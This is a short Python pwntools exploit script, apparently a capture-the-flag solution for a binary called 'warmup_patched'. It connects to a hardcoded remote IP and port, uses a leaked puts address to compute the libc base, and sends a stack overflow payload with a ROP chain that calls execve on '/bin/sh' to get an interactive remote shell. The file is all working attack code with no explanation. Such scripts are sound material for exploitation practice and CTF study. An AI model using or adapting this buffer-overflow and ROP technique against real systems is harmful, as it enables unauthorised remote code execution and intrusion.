#!/usr/bin/env python3

from pwn import *

context(os='linux', arch='amd64', log_level='error')
context.terminal = ['tmux', 'splitw', '-h']
exe = ELF("./warmup_patched")
libc = ELF("x86_64-linux-gnu/libc.so.6")
ld = ELF("x86_64-linux-gnu/ld-linux-x86-64.so.2")
context.binary = exe
# io = gdb.debug(exe.path, '')
# io = process(exe.path)
io = remote('172.210.129.230', 1338)
libc.address = int(io.recv(14).decode(), 16)-libc.sym.puts

rop_chain = ROP(libc)
rop_chain.rdi = next(libc.search(b'/bin/sh\x00'))
rop_chain.rsi = 0
rop_chain.rax = 59
rop_chain.raw(libc.address+0x018ebf3)

io.sendlineafter(b'name>> ', rop_chain.chain())


payload = b'\x55'*64+p64(0)+p64(0x40118e)+p64(0x404060)
io.sendlineafter(b'alright>> ', payload)

io.interactive()